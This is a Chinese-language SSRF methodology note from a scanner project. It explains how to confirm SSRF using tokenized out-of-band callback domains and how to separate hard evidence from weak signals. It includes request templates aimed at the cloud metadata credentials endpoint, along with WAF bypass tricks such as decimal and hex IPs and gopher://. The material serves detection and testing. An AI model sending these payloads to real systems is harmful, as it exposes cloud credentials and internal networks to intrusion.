# War Story — SSRF 判定：OOB 回连是硬证据，响应差异只是线索

> 来源：hack_scanner 项目 OOB 检测经验提炼（scanners/oob_detector.py + vuln_kb SSRF 模式卡）

## 元信息

| 字段 | 值 |
|------|------|
| **日期** | 2026-08-25 |
| **目标** | 典型 SSRF 面（模板化提炼） |
| **类型** | 攻击链模板 — SSRF + OOB 验证 |
| **关键词** | SSRF、OOB、回连、DNS 日志、云 metadata、内网探测 |
| **轮数** | 4-8 轮（探测 → 触发 → 验证） |
| **工具链** | http_probe / OOB 交互器 / 日志轮询 |

---

## 攻击链（标准流程）

| 步骤 | 操作 | 判定信号 |
|------|------|----------|
| 1 | RECON：找"服务端会去访问用户可控 URL"的面（webhook/import/preview/proxy/fetch） | 参数名线索：url, link, src, image, callback, target |
| 2 | 拿 OOB 域名（带标识子域） | 建立"哪个交互器 = 哪次触发"的对应 |
| 3 | 触发：把 OOB URL 填进候选参数 | — |
| 4 | 轮询 OOB 日志（HTTP/DNS） | **命中带标识子域 = 确认 SSRF**（硬证据） |
| 5 | 升级判定：`169.254.169.254/latest/meta-data/`（云 metadata）/ 内网段回连 | metadata 可读 = critical；仅 DNS 解析 = 弱信号 |
| 6 | 绕过尝试：十进制 IP / 短域名 / `@bypass` / 协议替换（gopher://） | 部分 WAF 只拦 `http://10.` 字面量 |

## 关键突破

**OOB 回连 = 唯一硬证据**。
服务端访问受内网限制时，响应里什么都看不到（time-based 差异/错误消息都是二手线索）。
带**标识子域**的 OOB 域名让"这次回连是我触发的"可归因 —— 没有标识子域，一条 DNS 日志无法排除是其他租户/扫描器产生的。

## 走的弯路

| 弯路 | 原因 | 教训 |
|------|------|------|
| 用响应时间差判 SSRF | 网络抖动 + 服务端缓存都造出时间差 | 时间差只能作"值得进一步验证"的线索，不能入报告 |
| OOB 域名无标识子域 | 共享交互器日志混入无关流量 | 每次触发生成唯一子域，日志按子域归因 |
| 只试 `http://169.254.169.254` | WAF 字面量拦截 | 十进制 IP（`2852039166`）/ `0x7f000001` / URL 编码变体逐层升级（见 reflexion L1-L4） |
| 把"URL 参数存在"报成 SSRF | 参数存在 ≠ 服务端会访问 | 判定门槛：必须有 OOB 命中或 metadata 内容回显 |

## Payload（可复现 — 模板）

```
# 1. 生成标识子域: <token>.<oob-domain>
# 2. 触发
GET /api/preview?url=https://<token>.<oob-domain>/
# 3. 轮询 OOB 日志，命中 <token> 子域 = 确认
# 4. 云环境升级
GET /api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
#    响应含 credential 名/内容 = critical
```

## 经验总结

1. **SSRF 报告门槛**：OOB 回连（带标识子域）或 metadata 内容回显，二者居一
2. **标识子域 = 归因**：共享交互器必须 token 化子域，否则日志不可信
3. **metadata 端点是云 SSRF 的 critical 判据**，优先于纯内网探测
4. **WAF 绕过逐层升级**：字面量 → 十进制/十六进制 IP → 协议替换（与 reflexion 升级表 L1-L4 对齐）
5. **时间盲 SSRF 降级为线索**，写进报告的"可疑面"而不是"确认漏洞"
